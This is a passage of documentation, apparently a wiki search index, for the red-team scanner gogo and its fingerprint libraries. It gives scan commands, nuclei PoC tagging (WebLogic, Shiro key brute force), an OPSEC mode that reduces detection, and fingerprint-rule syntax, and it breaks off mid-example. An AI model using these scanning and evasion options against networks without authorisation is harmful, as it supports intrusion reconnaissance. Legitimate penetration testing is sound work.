<p>gogo\u5e76\u975e\u6f0f\u626b\u5de5\u5177,\u56e0\u6b64\u4e0d\u4f1a\u652f\u6301sql\u6ce8\u5165, xss\u4e4b\u7c7b\u7684\u901a\u7528\u6f0f\u6d1e\u63a2\u6d4b\u529f\u80fd\u3002</p> <p>\u76ee\u524dgogo\u652f\u6301\u7684\u6240\u6709\u6f0f\u6d1e: https://chainreactors.github.io/wiki/gogo/detail/#_6</p> <p>\u4e3a\u4e86\u652f\u6301\u5185\u7f51\u66f4\u597d\u7684\u81ea\u52a8\u5316, \u96c6\u6210\u4e86nuclei\u7684poc, \u53ef\u4ee5\u7528\u6765\u7f16\u5199poc\u6279\u91cf\u6267\u884c\u67d0\u4e9b\u7279\u5b9a\u7684\u626b\u63cf\u4efb\u52a1, \u4ee5\u53ca\u4e00\u4e9b\u9ed8\u8ba4\u53e3\u4ee4\u767b\u5f55\u7684poc</p> <p>nuclei\u7684\u4e2dpoc\u5f80\u5f80\u653b\u51fb\u6027\u6bd4\u8f83\u5f3a, poc\u79fb\u690d\u5230gogo\u4e4b\u524d\u4f1a\u8fdb\u884c\u4e00\u4e9b\u4fee\u6539\u548c\u590d\u73b0, \u56e0\u6b64\u4e0d\u6253\u7b97\u4e00\u53e3\u6c14\u79fb\u690d\u5168\u90e8\u7684nuclei poc</p> <p>\u76ee\u524d\u5df2\u96c6\u6210\u7684pocs\u89c1<code>v2/templates/nuclei</code>, \u4ee5\u53cams17010\u3001shiro\u3001snmp\u7b49\u7279\u6b8a\u7684\u6f0f\u6d1e</p> <p>nuclei poc\u5c06\u4f1a\u6839\u636e\u6307\u7eb9\u8bc6\u522b\u7684\u60c5\u51b5\u81ea\u52a8\u8c03\u7528, \u800c\u975e\u4e00\u53e3\u6c14\u5168\u6253\u8fc7\u53bb, \u4e3a\u4e86\u66f4\u597d\u7684\u63a2\u6d4b\u6f0f\u6d1e, \u5efa\u8bae\u540c\u65f6\u5f00\u542f<code>-v</code>\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b</p> <p>\u4f7f\u7528:</p> <p><code>gogo -i 192.168.1.1/24 -p top2 -ev</code></p> <p>\u67d0\u4e9b\u60c5\u51b5\u4e0b, \u53ef\u80fd\u4f1a\u56e0\u4e3a\u6307\u7eb9\u6ca1\u6709\u6b63\u786e\u5339\u914d, \u5bfc\u81f4poc\u65e0\u6cd5\u6b63\u786e\u8c03\u7528, \u56e0\u6b64\u4e5f\u63d0\u4f9b\u4e86<code>-E</code> \u53c2\u6570\u5f3a\u5236\u6307\u5b9apoc\u7684name\u3001id\u6216tag</p> <p>\u4f8b\u5982<code>gogo -i 192.168.1.1 -p 7001 -E weblogic</code>, \u5c06\u4f1a\u8c03\u7528\u6240\u6709\u5e26weblogic tag\u7684poc. </p> <p>\u6ce8\u610f.</p> <p>\u5f53\u524d\u6240\u6709\u7684workflow\u90fd\u6ca1\u6709\u6dfb\u52a0<code>-v</code> \u4e0e<code>-e</code> , \u5982\u679c\u6709\u9700\u8981, \u8bf7\u5728\u4f7f\u7528workflow\u65f6\u624b\u52a8\u6dfb\u52a0<code>-ev</code></p>"},{"location":"gogo/start/#\u7279\u6b8a\u7aef\u53e3\u652f\u6301","title":"\u7279\u6b8a\u7aef\u53e3\u652f\u6301","text":"<p>\u90e8\u5206\u7279\u6b8a\u7aef\u53e3\u4ee5\u63d2\u4ef6\u7684\u5f62\u5f0f\u652f\u6301, \u800c\u975e\u9ed8\u8ba4\u7684\u63a2\u6d4b\u7aef\u53e3\u72b6\u6001. \u53ef\u4ee5\u6536\u96c6\u4e00\u4e9b\u989d\u5916\u7684\u4fe1\u606f.</p> <ul> <li>WMI,  <code>gogo -i 172.16.1.1/24 -p wmi</code></li> <li>OXID, <code>gogo -i 172.16.1.1/24 -p oxid</code></li> <li>NBTScan, <code>gogo -i 172.16.1.1/24 -p nbt</code></li> <li>PING, <code>gogo -i 172.16.1.1/24 -p icmp</code></li> <li>SNMP, <code>gogo -i 172.16.1.1/24 -p snmp</code></li> <li>SMB, <code>gogo -i 172.16.1.1/24 -p smb</code></li> </ul> <p>\u53ef\u4ee5\u4efb\u610f\u7ec4\u5408\u4f7f\u7528, \u4f8b\u5982:</p> <p><code>gogo -i 172.16.1.1/24 -p smb,wmi,oxid,nbt,icmp,80,443,top2</code></p> <p>ICMP\u7684\u6743\u9650</p> <p>\u5728linux\u4e2d, \u975eroot\u6743\u9650\u65e0\u6cd5\u4f7f\u7528icmp, \u4f46\u662f\u53ef\u4ee5\u901a\u8fc7suid\u8c03\u7528\u53ef\u6267\u884c\u6587\u4ef6ping, \u4f46\u8fd9\u4f1a\u5bfc\u81f4\u6bcf\u4e2agoroutine\u90fd\u8d77\u4e00\u4e2a\u5b50\u8fdb\u7a0b, \u53ef\u80fd\u5bf9\u76ee\u6807\u9020\u6210\u4e0d\u53ef\u9884\u6599\u7684\u540e\u679c\u3002\u56e0\u6b64gogo\u653e\u5f03\u4e86\u8fd9\u79cd\u505a\u6cd5, \u5e76\u6dfb\u52a0\u4e86\u81ea\u52a8\u7684\u9519\u8bef\u5904\u7406, \u5982\u679c\u5f53\u524d\u6743\u9650\u975eroot, \u5219\u81ea\u52a8\u8df3\u8fc7icmp\u76f8\u5173\u7684\u626b\u63cf\u3002\u5982\u679c\u6307\u5b9a\u4e86<code>--icmp</code> \u4e5f\u4f1a\u8df3\u8fc7\u5148icmp\u9a8c\u6d3b\u8fd9\u4e2a\u6b65\u9aa4, \u76f4\u63a5\u8fdb\u5165\u5230\u4e0b\u4e00\u6b65\u4e2d\u3002 Windows\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u5c31\u7b97\u662f\u666e\u901a\u7528\u6237\u6743\u9650\u4e5f\u80fd\u4f7f\u7528icmp, \u6781\u5c11\u6570\u60c5\u51b5\u4e0b\u4f1a\u53d1\u751f\u6743\u9650\u4e0d\u8db3\u7684\u62a5\u9519\u3002 \u4e0d\u7ba1\u662fWindows\u8fd8\u662fLinux, \u53d1\u751f\u4e86\u76f8\u5173\u7684\u95ee\u9898\u90fd\u4f1a\u5728\u547d\u4ee4\u884c\u4e2d\u8f93\u51fa\u76f8\u5173\u7684\u63d0\u793a, \u6216\u8005\u6253\u5f00<code>--debug</code>\u67e5\u770b\u6bcf\u4e2a\u8bf7\u6c42\u7684\u5931\u8d25\u539f\u56e0, \u53ef\u4ee5\u4eba\u5de5\u5224\u65ad\u540e\u8c03\u6574\u626b\u63cf\u903b\u8f91\u3002</p>"},{"location":"gogo/start/#debug","title":"debug","text":"<p>\u6253\u5f00<code>--debug</code>\u53ef\u4ee5\u770b\u5230\u6bcf\u4e2a\u8bf7\u6c42\u7684\u5386\u53f2\u8bb0\u5f55\u4e0e\u9519\u8bef\u539f\u56e0, \u7aef\u53e3\u72b6\u6001, \u63d2\u4ef6\u53d1\u9001\u7684\u6570\u636e, \u6307\u7eb9\u7684\u547d\u4e2d\u60c5\u51b5, \u8c03\u7528\u7684poc\u7b49\u7b49\u8be6\u7ec6\u6570\u636e, \u7528\u6765\u7814\u5224gogo\u662f\u5426\u6b63\u5e38\u5de5\u4f5c\u3002</p> <p>plugin-debug</p> <p>\u56e0\u4e3a\u4f7f\u7528\u4e86ants\u5e93, \u5982\u679cplugin\u4e2d\u5bfc\u81f4\u7684\u62a5\u9519\u4f1a\u88ab\u6355\u83b7\u5e76\u8df3\u8fc7\u3002\u6240\u4ee5\u5982\u679cplugin\u4e2d\u7684\u4ee3\u7801\u53d1\u751f\u4e86\u9519\u8bef, \u9700\u8981<code>--plugin-debug</code>\u53c2\u6570\u53bb\u5c55\u793a\u62a5\u9519\u5806\u6808, \u5426\u5219\u53ea\u80fd\u770b\u5230\u62a5\u9519\u539f\u56e0, \u96be\u4ee5debug\u3002</p>"},{"location":"gogo/start/#\u542f\u53d1\u5f0f\u626b\u63cf","title":"\u542f\u53d1\u5f0f\u626b\u63cf","text":"<ul> <li><code>--mod s</code> , \u6839\u636e\u7aef\u53e3\u63a2\u9488, \u55b7\u6d12\u5b58\u6d3b\u7684C\u6bb5.  \u9012\u5f52\u4e0b\u964d\u5230default scan</li> <li><code>--mod ss</code>,  \u6839\u636eip\u63a2\u9488, \u55b7\u6d12\u5b58\u6d3b\u7684B\u6bb5, \u9012\u5f52\u4e0b\u964d\u5230<code>--mod s</code></li> <li><code>--mod sc</code> , \u5148\u8fdb\u884c<code>--mod ss</code>\u63a2\u6d4b\u5b58\u6d3bB\u6bb5, \u7136\u540e\u9012\u5f52\u4e0b\u964d\u5230<code>--mod s</code>, \u5e76\u5728default scan\u524d\u9000\u51fa, \u7528\u6765\u63a2\u6d4bA\u6bb5\u4e2d\u5b58\u6d3b\u7684C\u6bb5.  \u662f<code>--mod ss</code>\u7684\u4e00\u4e2a\u7279\u4f8b, \u7528\u4f5c\u7b80\u5316\u64cd\u4f5c.</li> <li><code>--ping</code>, \u5728\u9012\u5f52\u4e0b\u964d\u5230default scan, \u63d2\u5165icmp\u534f\u8bae\u7684ip\u5b58\u6d3b\u63a2\u6d4b, \u9012\u5f52\u4e0b\u964d\u5230default scan</li> <li><code>--no</code> \u5728\u542f\u7528\u542f\u53d1\u5f0f\u626b\u63cf\u65f6, \u5982\u679c\u505c\u6b62\u6240\u6709\u9012\u5f52\u4e0b\u964d, \u53ea\u4f1a\u8fdb\u884c\u5f53\u524d\u9636\u6bb5\u7684\u542f\u53d1\u5f0f\u626b\u63cf, \u4f8b\u5982<code>-m ss</code>\u5c06\u4e0d\u4f1a\u4e0b\u964d\u4e3a<code>-m s</code></li> <li><code>--ipp</code> ip probe, \u63a7\u5236\u5728supersmart\u6a21\u5f0f\u4e0b\u6bcf\u4e2aC\u6bb5\u9700\u8981\u63a2\u6d4b\u7684ip</li> <li><code>--sp</code>  smart port probe, \u63a7\u5236\u5728smart\u6a21\u5f0f\u4e0b\u6bcf\u4e2aip\u7684\u7aef\u53e3\u63a2\u9488</li> </ul> <p>\u542f\u53d1\u5f0f\u626b\u63cf\u9700\u8981\u5408\u9002\u7684\u53c2\u6570\u7ec4\u5408\u624d\u80fd\u53d1\u6325\u6700\u5927\u7684\u4f5c\u7528\u3002</p> <p>\u7edd\u5927\u591a\u6570\u5e38\u7528\u7684\u542f\u53d1\u5f0f\u626b\u63cf\u573a\u666f\u5df2\u7ecf\u88ab\u5c01\u88c5\u5230workflow\u4e2d, \u66f4\u5efa\u8bae\u5728workflow\u4e2d\u8c03\u7528\u5bf9\u5e94\u7684\u626b\u63cf\u903b\u8f91.\u3002</p> <p>\u5982\u9700\u4e86\u89e3\u6bcf\u4e2a\u7ec6\u8282\u548c\u539f\u7406, \u8bf7\u89c1 \u542f\u53d1\u5f0f\u626b\u63cf\u539f\u7406</p>"},{"location":"gogo/start/#opsec","title":"OPSEC","text":"<p>gogo\u662f\u9762\u5411\u7ea2\u961f\u7684\u5de5\u5177, \u6240\u4ee5OPSEC\u4e5f\u662f\u5176\u8bbe\u8ba1\u7684\u6838\u5fc3\u7406\u5ff5.</p> <p><code>--opsec</code> \u53ef\u4ee5\u4f7f\u5f97\u626b\u63cf\u65f6\u7279\u5f81\u66f4\u5c0f, \u4e5f\u4f1a\u5e26\u6765\u4e00\u5b9a\u7684\u80fd\u529b\u635f\u5931. </p> <p>fingers\u7684opsec <pre><code>- name: swagger\n  focus: true\n  opsec: true\n  rule:\n    - regexps:\n        vuln:\n          - Swagger UI\n      send_data: /swagger-ui.html\n      info: swagger leak\n</code></pre></p> <p>neutron\u7684opsec <pre><code>id: shiro-default-key\nopsec: true\ninfo:\n  name: brute Shiro key\n  severity: critical\n  tags: shiro\n...\n</code></pre></p> <p>\u901a\u8fc7\u5728templates\u4e2d\u6dfb\u52a0\u8fd9\u4e24\u4e2a\u914d\u7f6e\u9879\u5373\u53ef\u5728<code>--opsec</code>\u65f6\u81ea\u52a8\u5ffd\u7565</p>"},{"location":"gogo/start/#make","title":"Make","text":"<pre><code># download\ngit clone --recurse-submodules https://github.com/chainreactors/gogo\ncd gogo/v2\n\n# sync dependency\ngo mod tidy   \n\n# generate template.go\ngo generate\n\n# build \ngo build .\n</code></pre>"},{"location":"gogo/start/#\u6ce8\u610f\u4e8b\u9879","title":"\u6ce8\u610f\u4e8b\u9879","text":"<p>\u6ce8\u610f\u4e8b\u9879!</p> <ul> <li>(\u91cd\u8981)\u56e0\u4e3a\u5e76\u53d1\u8fc7\u9ad8, \u53ef\u80fd\u5bf9\u8def\u7531\u4ea4\u6362\u8bbe\u5907\u9020\u6210\u4f24\u5bb3, \u4f8b\u5982, \u67d0\u4e9b\u5bb6\u7528\u8def\u7531\u8bbe\u5907\u9762\u5bf9\u9ad8\u5e76\u53d1\u53ef\u80fd\u4f1a\u6b7b\u673a\u3001\u91cd\u542f\u3001\u8fc7\u70ed\u7b49\u540e\u679c\u3002\u56e0\u6b64\u5728\u5916\u7f51\u626b\u63cf\u7684\u573a\u666f\u4e0b**\u5efa\u8bae\u5728\u963f\u91cc\u4e91\u3001\u534e\u4e3a\u4e91\u7b49vps\u4e0a\u4f7f\u7528** , \u5982\u679c\u626b\u63cf\u56fd\u5916\u8d44\u4ea7, \u5efa\u8bae\u5728\u56fd\u5916vps\u4e0a\u4f7f\u7528\u3002\u672c\u5730\u4f7f\u7528\u5982\u679c\u7f51\u7edc\u8bbe\u5907\u6027\u80fd\u4e0d\u4f73\u4f1a\u5e26\u6765\u5927\u91cf\u4e22\u5305\u3002\u5982\u679c\u5728\u5185\u7f51\u626b\u63cf\u9700\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574\u5e76\u53d1\u6570\u3002</li> <li>\u5982\u679c\u4f7f\u7528\u4e2d\u53d1\u73b0\u75af\u72c2\u62a5\u9519, \u5927\u6982\u7387\u662fio\u95ee\u9898(\u4f8b\u5982\u591a\u6b21\u626b\u63cf\u540eio\u6ca1\u6709\u88ab\u6b63\u786e\u91ca\u653e, \u6216\u8005\u914d\u5408proxifier\u4ee5\u53ca\u7c7b\u4f3c\u4ee3\u7406\u5de5\u5177\u4f7f\u7528\u62a5\u9519), \u53ef\u4ee5\u901a\u8fc7\u91cd\u542f\u7535\u8111\u3001\u865a\u62df\u673a\u4e2d\u4f7f\u7528\u3001\u5173\u95ed\u4ee3\u7406\u5de5\u5177\u89e3\u51b3, \u5982\u679c\u4f9d\u65e7\u65e0\u6cd5\u89e3\u51b3\u8bf7\u8054\u7cfb\u6211\u4eec\u3002</li> <li>upx\u538b\u7f29\u540e\u4f53\u79ef\u5927\u6982\u57282m\u5de6\u53f3, \u4f46\u662f\u67d0\u4e9b\u6740\u8f6f\u53ef\u80fd\u4f1a\u67e5\u6740upx\u58f3, \u5728\u6781\u5c11\u6570\u60c5\u51b5\u4e0bupx\u538b\u7f29\u5b8c\u53ef\u80fd\u4f1a\u65e0\u6cd5\u8fd0\u884c, \u8bf7\u81ea\u884c\u9009\u62e9\u662f\u5426\u4f7f\u7528upx\u538b\u7f29, \u9ed8\u8ba4\u53d1\u5e03\u7684\u7248\u672c\u6ca1\u6709\u4f7f\u7528upx\u538b\u7f29\u3002</li> <li>\u4e00\u822c\u60c5\u51b5\u4e0d\u5efa\u8bae\u5728\u4ee3\u7406\u573a\u666f\u4e0b\u4f7f\u7528, \u5982\u679c\u4e00\u5b9a\u8981\u5728\u4ee3\u7406\u573a\u666f\u4e0b\u4f7f\u7528, \u5efa\u8bae<code>-t</code>\u8c03\u6574\u5e76\u53d1\u5230\u5408\u9002\u7684\u6570\u91cf, \u9ed8\u8ba4\u4e3a4000\u5e76\u53d1, \u6781\u6709\u53ef\u80fd\u6253\u5d29\u4ee3\u7406\u3002</li> <li>gogo\u672c\u8eab\u5e76\u4e0d\u5177\u5907\u4efb\u4f55\u653b\u51fb\u6027, \u4e5f\u65e0\u6cd5\u5bf9\u4efb\u4f55\u6f0f\u6d1e\u8fdb\u884c\u5229\u7528, \u56e0\u6b64\u4e5f\u4e0d\u4f1a\u5bf9\u5e94\u7528\u9020\u6210\u635f\u5bb3, \u4f46\u6709\u53ef\u80fd\u56e0\u4e3a\u9ad8\u5e76\u53d1\u5bf9\u7f51\u7edc\u73af\u5883\u9020\u6210\u963b\u585e, \u8bf7\u8c28\u614e\u4f7f\u7528\u3002</li> <li>\u4e0d\u8981\u8fc7\u4e8e\u76f8\u4fe1gogo\u7684\u6307\u7eb9\u4e0e\u6f0f\u6d1e\u7ed3\u679c, gogo\u662f\u4e3a\u4e86\u7ea2\u961f\u6700\u5feb\u901f\u63a2\u6d4b\u8bbe\u8ba1\u7684, \u800c\u4e0d\u662f\u6700\u51c6\u786e\u8bbe\u8ba1\u7684. </li> <li>\u4f7f\u7528gogo\u9700\u5148\u786e\u4fdd\u83b7\u5f97\u4e86\u6388\u6743, gogo\u53cd\u5bf9\u4e00\u5207\u975e\u6cd5\u7684\u9ed1\u5ba2\u884c\u4e3a</li> </ul>"},{"location":"gogo/start/#\u4f7f\u7528\u573a\u666f\u5e76\u53d1\u63a8\u8350","title":"\u4f7f\u7528\u573a\u666f\u5e76\u53d1\u63a8\u8350","text":"<p>\u9ed8\u8ba4\u7684\u5e76\u53d1linux\u4e3a4000, windows\u4e3a1000, \u4e3a\u4f01\u4e1a\u7ea7\u7f51\u7edc\u73af\u5883\u4e0b\u53ef\u7528\u7684\u5e76\u53d1\u3002\u5f31\u7f51\u7edc\u73af\u5883(\u5bb6\u5ead, \u57fa\u7ad9\u7b49)\u53ef\u80fd\u4f1a\u5bfc\u81f4\u7f51\u7edcdos\u3002</p> <p>\u5efa\u8bae\u6839\u636e\u4e0d\u540c\u73af\u5883,\u624b\u52a8\u4f7f\u7528<code>-t</code>\u53c2\u6570\u6307\u5b9a\u5408\u9002\u7684\u5e76\u53d1\u6570\u3002</p> <ul> <li>\u5bb6\u7528\u8def\u7531\u5668(\u4f8b\u5982\u9493\u9c7c, \u7269\u7406, \u672c\u673a\u626b\u63cf)\u65f6, \u5efa\u8bae\u5e76\u53d1 100-500</li> <li>Linux \u4f01\u4e1a\u7f51\u7edc\u73af\u5883(\u4f8b\u5982\u5916\u7f51\u7a81\u7834web\u83b7\u53d6\u7684\u70b9), \u9ed8\u8ba4\u5e76\u53d14000, \u4e0d\u9700\u8981\u624b\u52a8\u4fee\u6539</li> <li>Windows \u4f01\u4e1a\u7f51\u7edc\u73af\u5883, \u9ed8\u8ba4\u5e76\u53d11000, \u4e0d\u9700\u8981\u624b\u52a8\u4fee\u6539</li> <li>\u9ad8\u5e76\u53d1\u4e0budp\u534f\u8bae\u6f0f\u62a5\u8f83\u591a, \u4f8b\u5982\u83b7\u53d6netbois\u4fe1\u606f\u65f6, \u5efa\u8bae\u5355\u72ec\u5bf9udp\u534f\u8bae\u4ee5\u8f83\u4f4e\u5e76\u53d1\u91cd\u65b0\u63a2\u6d4b</li> <li>Web\u7684\u6b63\u5411\u4ee3\u7406(\u4f8b\u5982regeorg),\u5efa\u8bae\u5e76\u53d1 10-30</li> <li>\u53cd\u5411\u4ee3\u7406(\u4f8b\u5982frp), \u5efa\u8bae\u5e76\u53d110-100</li> </ul> <p>\u5982\u679c\u5982\u679c\u53d1\u751f\u5927\u91cf\u6f0f\u62a5\u7684\u60c5\u51b5, \u5927\u6982\u7387\u662f\u7f51\u7edc\u73af\u5883\u53d1\u751f\u7684\u963b\u585e, \u5bfc\u81f4\u7f51\u7edc\u5ef6\u8fdf\u4e0a\u5347\u8d85\u8fc7\u9ed8\u8ba4\u7684\u8d85\u65f6\u65f6\u95f4\u800c\u4ea7\u751f\u7684\u6f0f\u62a5.</p> <p>\u56e0\u6b64\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a <code>-d 5</code>(tcp\u9ed8\u8ba4\u4e3a2s, tls\u9ed8\u8ba4\u4e3a\u4e24\u500dtcp\u8d85\u65f6\u65f6\u95f4, \u53734s)\u6765\u63d0\u9ad8\u8d85\u65f6\u65f6\u95f4, \u51cf\u5c11\u6f0f\u62a5\u3002</p> <p>\u672a\u6765\u4e5f\u8bb8\u4f1a\u5b9e\u73b0auto-tune, \u81ea\u52a8\u8c03\u6574\u5e76\u53d1\u901f\u7387\u3002</p>"},{"location":"libs/","title":"index","text":"<ul> <li> <p>words , \u4f7f\u7528 go \u91cd\u5199\u4e86 hashcat \u4e2d\u7684 mask/rule \u5b57\u5178\u751f\u6210\u5668, \u5e76\u6dfb\u52a0\u4e86\u4e00\u4e9b\u65b0\u529f\u80fd</p> </li> <li> <p>templates , gogo \u7684\u6307\u7eb9\u5e93, poc \u5e93\u7b49; \u4e5f\u4e3a spray,kindred \u7b49\u5de5\u5177\u63d0\u4f9b\u6307\u7eb9\u8bc6\u522b\u529f\u80fd</p> </li> <li> <p>neutron \u4f7f\u7528\u7eaf go \u5b9e\u73b0\u5e76\u53bb\u6389\u6240\u6709\u7b2c\u4e09\u65b9\u4f9d\u8d56\u7684\u8f7b\u91cf\u7ea7 nuclei \u5f15\u64ce, \u53ef\u4ee5\u65e0\u526f\u4f5c\u7528\u7684\u96c6\u6210\u5230\u4efb\u610f\u5de5\u5177\u4e2d\u800c\u4e0d\u4f1a\u5e26\u6765\u989d\u5916\u7684\u4f9d\u8d56.</p> </li> <li> <p>fingers  templates, wappalyzer, fingerprinthub\u7b49\u6307\u7eb9\u5e93\u7684go\u5b9e\u73b0,  \u652f\u6301\u6dfb\u52a0\u5404\u7c7b\u7b2c\u4e09\u65b9\u6307\u7eb9\u5e93</p> </li> <li> <p>parsers, \u5c01\u88c5\u4e86 chainreactor \u5de5\u5177\u94fe\u4e0a\u7684\u5404\u4e2a\u5de5\u5177\u8f93\u5165\u8f93\u51fa\u7684\u89e3\u6790\u76f8\u5173\u7684\u4ee3\u7801.</p> </li> <li> <p>proxyclient golang \u4ee3\u7406\u5ba2\u6237\u7aef, \u652f\u6301http/https, socks5/socks4/socks4a, ssh, shadowsocks, neoreg, suo5</p> </li> </ul>"},{"location":"libs/fingers/","title":"overview","text":"<p>repo: https://github.com/chainreactors/fingers</p> <p>fingers \u662f\u7528\u6765\u5404\u79cd\u6307\u7eb9\u89c4\u5219\u5e93\u7684go\u5b9e\u73b0, \u4e0d\u540c\u89c4\u5219\u5e93\u7684\u8bed\u6cd5\u4e0d\u540c, \u4e3a\u4e86\u652f\u6301\u5728\u5de5\u5177\u591a\u89c4\u5219\u5e93. \u4e8e\u662f\u65b0\u589e\u4e86fingers\u4ed3\u5e93\u7ba1\u7406\u5404\u79cd\u4e0d\u540c\u7684\u89c4\u5219\u5f15\u64ce, \u5141\u8bb8\u4e0d\u540c\u7684\u8f93\u5165\u7ed3\u6784, \u4f46\u7edf\u4e00\u8f93\u51fa\u7ed3\u6784. \u5e76\u5408\u5e76\u8f93\u51fa\u7ed3\u679c, \u6700\u5927\u5316\u6307\u7eb9\u8bc6\u522b\u80fd\u529b</p> <p>\u76ee\u524dfingers\u4ed3\u5e93\u5df2\u7ecf\u6210\u4e3aspray \u4e0e gogo\u7684\u6307\u7eb9\u5f15\u64ce.  \u540e\u7eed\u5c06\u79fb\u690d\u5230\u66f4\u591a\u5de5\u5177\u4e2d, \u4e5f\u6b22\u8fce\u5176\u4ed6\u5de5\u5177\u4f7f\u7528\u672c\u4ed3\u5e93. </p>"},{"location":"libs/fingers/#features","title":"Features","text":""},{"location":"libs/fingers/#\u6307\u7eb9\u5e93","title":"\u6307\u7eb9\u5e93","text":"<p>fingers engine \u901a\u8fc7\u5b9e\u73b0\u591a\u4e2a\u6307\u7eb9\u5e93\u7684\u89e3\u6790, \u5b9e\u73b0\u4e00\u6b21\u626b\u63cf\u591a\u4e2a\u6307\u7eb9\u5e93\u5339\u914d\u3002\u6700\u5927\u7a0b\u5ea6\u63d0\u5347\u6307\u7eb9\u80fd\u529b</p>"},{"location":"libs/fingers/#fingers","title":"fingers","text":"<p>fingers\u539f\u751f\u652f\u6301\u7684\u6307\u7eb9\u5e93, \u4e5f\u662f\u76ee\u524d\u652f\u6301\u6700\u591a\u7279\u6027\u7684\u6307\u7eb9\u5e93</p> <p>Features.</p> <ul> <li>\u652f\u6301\u591a\u79cd\u65b9\u5f0f\u89c4\u5219\u914d\u7f6e<ul> <li>\u652f\u6301\u591a\u79cd\u65b9\u5f0f\u7684\u7248\u672c\u53f7\u5339\u914d</li> <li>404/favicon/waf/cdn/\u4f9b\u5e94\u94fe\u6307\u7eb9\u8bc6\u522b</li> <li>\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b</li> <li>\u8d85\u5f3a\u6027\u80fd, \u91c7\u7528\u4e86\u7f13\u5b58,\u6b63\u5219\u9884\u7f16\u8bd1,\u9ed8\u8ba4\u7aef\u53e3,\u4f18\u5148\u7ea7\u7b49\u7b49\u7b97\u6cd5\u63d0\u9ad8\u5f15\u64ce\u6027\u80fd</li> <li>\u91cd\u70b9\u6307\u7eb9,\u6307\u7eb9\u6765\u6e90\u4e0etag\u6807\u8bb0</li> </ul> </li> </ul> <p>\u5177\u4f53\u8bed\u6cd5\u8bf7\u89c1 #DSL</p>"},{"location":"libs/fingers/#wappalyzer","title":"wappalyzer","text":"<p>https://github.com/chainreactors/fingers/tree/master/wappalyzer \u4e3awappalyzer\u6307\u7eb9\u5e93\u7684\u5b9e\u73b0, \u6838\u5fc3\u4ee3\u7801fork\u81ea https://github.com/projectdiscovery/wappalyzergo , \u5c06\u5176\u8f93\u51fa\u7ed3\u679c\u7edf\u4e00\u4e3aframeworks.</p> <p>\u540e\u7eed\u5c06\u4f1a\u63d0\u4f9b\u6bcf\u5468\u66f4\u65b0\u7684github action, \u89c4\u5219\u5e93\u53ea\u505a\u540c\u6b65. </p>"},{"location":"libs/fingers/#fingerprinthub","title":"fingerprinthub","text":"<p>\u89c4\u5219\u5e93\u672c\u4f53\u4f4d\u4e8e: https://github.com/0x727/FingerprintHub</p> <p>https://github.com/chainreactors/fingers/tree/master/fingerprinthub \u4e3a\u5176\u89c4\u5219\u5e93\u7684go\u5b9e\u73b0. \u672c\u4ed3\u5e93\u7684\u6b64\u89c4\u5219\u5e93\u53ea\u505a\u540c\u6b65.</p> <p>\u540e\u7eed\u5c06\u4f1a\u63d0\u4f9b\u6bcf\u5468\u66f4\u65b0\u7684github action, \u89c4\u5219\u5e93\u53ea\u505a\u540c\u6b65. </p>"},{"location":"libs/fingers/#ehole","title":"ehole","text":"<p>\u89c4\u5219\u5e93\u672c\u4f53\u4f4d\u4e8e: https://github.com/EdgeSecurityTeam/EHole</p> <p>https://github.com/chainreactors/fingers/tree/master/ehole \u4e3a\u5176\u89c4\u5219\u5e93\u7684go\u5b9e\u73b0. \u672c\u4ed3\u5e93\u7684\u6b64\u89c4\u5219\u5e93\u53ea\u505a\u540c\u6b65.</p>"},{"location":"libs/fingers/#goby","title":"goby","text":"<p>\u89c4\u5219\u5e93\u672c\u4f53\u6765\u81ea\u5f00\u6e90\u793e\u533a\u7684\u9006\u5411goby Thanks @XiaoliChan @9bie .</p> <p>https://github.com/chainreactors/fingers/tree/master/goby \u4e3a\u5176\u89c4\u5219\u5e93\u7684go\u5b9e\u73b0. \u672c\u4ed3\u5e93\u7684\u6b64\u89c4\u5219\u5e93\u53ea\u505a\u540c\u6b65.</p>"},{"location":"libs/fingers/rule/","title":"rule","text":""},{"location":"libs/fingers/rule/#\u5185\u7f6e\u6307\u7eb9\u5e93\u8bed\u6cd5","title":"\u5185\u7f6e\u6307\u7eb9\u5e93\u8bed\u6cd5","text":"<p>\u6307\u7eb9\u5e93\u4f4d\u4e8e: https://github.com/chainreactors/templates/tree/master/fingers</p> <p>https://github.com/chainreactors/fingers/tree/master/fingers \u4e3a\u5176\u89c4\u5219\u5e93\u7684go\u8bed\u8a00\u5b9e\u73b0.</p> <p>\u6307\u7eb9\u5206\u4e3atcp\u6307\u7eb9\u3001http\u6307\u7eb9</p> <p>tcp\u6307\u7eb9\u4e0ehttp\u6307\u7eb9\u4e3a\u540c\u4e00\u683c\u5f0f, \u4f46\u901a\u8fc7\u4e0d\u540c\u7684\u6587\u4ef6\u8fdb\u884c\u7ba1\u7406</p>"},{"location":"libs/fingers/rule/#\u5b8c\u6574\u7684\u914d\u7f6e","title":"\u5b8c\u6574\u7684\u914d\u7f6e","text":"<p>\u914d\u7f6e\u6587\u4ef6: <code>v2/templates/http/*</code> \u4e0e <code>v2/templates/tcpfingers.yaml</code></p> <p>\u4e00\u4e2a\u5b8c\u6574\u7684\u914d\u7f6e:</p> <pre><code>- name: frame   # \u6307\u7eb9\u540d\u5b57, \u5339\u914d\u5230\u7684\u65f6\u5019\u8f93\u51fa\u7684\u503c\n  default_port: # \u6307\u7eb9\u7684\u9ed8\u8ba4\u7aef\u53e3, \u52a0\u901f\u5339\u914d. tcp\u6307\u7eb9\u5982\u679c\u5339\u914d\u5230\u7b2c\u4e00\u4e2a\u5c31\u4f1a\u7ed3\u675f\u6307\u7eb9\u5339\u914d, http\u5219\u4f1a\u7ee7\u7eed\u5339\u914d, \u6240\u4ee5\u9ed8\u8ba4\u7aef\u53e3\u5bf9http\u6ca1\u6709\u7279\u6b8a\u4f18\u5316\n    - '1111'\n  protocol: http  # tcp/http, \u9ed8\u8ba4\u4e3ahttp\n  rule:\n   - version: v1.1.1 # \u53ef\u4e0d\u586b, \u9ed8\u8ba4\u4e3a\u7a7a, \u8868\u793a\u65e0\u5177\u4f53\u7248\u672c\n     regexps: # \u5339\u914d\u7684\u65b9\u5f0f\n        vuln: # \u5339\u914d\u5230vuln\u7684\u6b63\u5219, \u5982\u679c\u5339\u914d\u5230, \u4f1a\u8f93\u51faframework\u4e3aname\u7684\u540c\u65f6, \u8fd8\u4f1a\u6dfb\u52a0vuln\u4e3avuln\u7684\u6f0f\u6d1e\u4fe1\u606f\n          - version:(.*) # 